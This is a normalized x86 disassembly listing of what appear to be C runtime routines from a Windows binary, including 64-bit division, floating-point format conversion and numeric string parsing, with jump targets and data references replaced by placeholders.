rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_41b5ff
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_41d24a
call sub_41d24a
mov [ esi ] eax
jmp r-xdata
call sub_416d94
push 0x16
pop esi
mov [ eax ] esi
call sub_416d42
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_41d24a
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_41b65e
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_41b6a6
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_41bbf7
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_41c148
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_416d94
mov [ eax ] 0x16
call sub_416d42
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_417f3c
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_41c7f4 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
